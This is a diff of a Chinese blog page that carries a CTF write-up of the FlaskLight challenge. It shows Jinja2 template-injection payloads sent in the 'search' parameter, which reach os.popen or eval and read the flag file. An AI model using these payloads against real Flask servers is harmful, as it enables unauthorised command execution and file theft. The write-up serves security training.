@@ -13,20 +13,11 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="题目地址：FlaskLight">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png">
 <meta property="article:published_time" content="2022-04-28T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-29T09:30:06.549Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png">
     
     
       
@@ -158,7 +149,8 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">FlaskLight</a></p>
+    <p>题目地址：<a
+target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight">FlaskLight</a></p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
 <p>进入页面查看源码得到提示信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Parameter Name: search --&gt;</span><br><span class="line">&lt;!-- Method: GET --&gt;</span><br></pre></td></tr></table></figure></p>
@@ -171,25 +163,36 @@
 <h3 id="site._printer"><code>site._Printer</code></h3>
 <p>首先查看是否内置os模块。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>在页面中找到如下内容：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png" /></p>
 <p>发现内置了os模块，因此直接引用，然后执行系统命令即可。</p>
 <p>查看当前目录和根目录： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png" /></p>
-<p>发现当前目录就是根目录，那么现在就需要找flag文件。起初使用<code>find / -name 'flag*'</code>，发现没有收获，如果通过查找内容的话<code>grep -r -i 'flag'</code>，时间太长导致无响应包。因此只能一个一个文件慢慢找，不过有一个目录叫做<code>flasklight</code>，因此先找它。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png" /></p>
-<p>第二个看过去像是一个flag文件，先用下面payload查看文件类型： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;file /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png" /></p>
+<p>发现当前目录就是根目录，那么现在就需要找flag文件。起初使用<code>find / -name 'flag*'</code>，发现没有收获，如果通过查找内容的话<code>grep -r -i 'flag'</code>，时间太长导致无响应包。因此只能一个一个文件慢慢找，不过有一个目录叫做<code>flasklight</code>，因此先找它。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png" /></p>
+<p>第二个看过去像是一个flag文件，先用下面payload查看文件类型：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;file /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png" /></p>
 <p>发现是一个文本文件，因此直接读取其内容： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png" /></p>
-<h3 id="warnings.catch_warnings"><code>warnings.catch_warnings</code></h3>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png" /></p>
+<h3
+id="warnings.catch_warnings"><code>warnings.catch_warnings</code></h3>
 <p>查看是否内置os模块： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png" /></p>
 <p>只找到了这么一处，说明没有内置os，因此需要导入。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png" /></p>
 <h2 id="文件包含-file">文件包含-<code>file</code></h2>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png" /></p>
 <h1 id="总结">总结</h1>
 <p>这道题让我感觉到了两处薄弱项：</p>
 <ol type="1">
@@ -243,7 +246,8 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&title=CSCCTF 2019 Qual FlaskLight"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&title=CSCCTF 2019 Qual FlaskLight"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&title=CSCCTF 2019 Qual FlaskLight"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&name=CSCCTF 2019 Qual FlaskLight&description=&lt;p&gt;题目地址：&lt;a href=&#34;https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight&#34;&gt;FlaskLight&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&name=CSCCTF 2019 Qual FlaskLight&description=&lt;p&gt;题目地址：&lt;a
+href=&#34;https://buuoj.cn/challenges#%5BCSCCTF%202019%20Qual%5DFlaskLight&#34;&gt;FlaskLight&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/29/CSCCTF%202019%20Qual%20FlaskLight/&t=CSCCTF 2019 Qual FlaskLight"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
@@ -264,7 +268,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
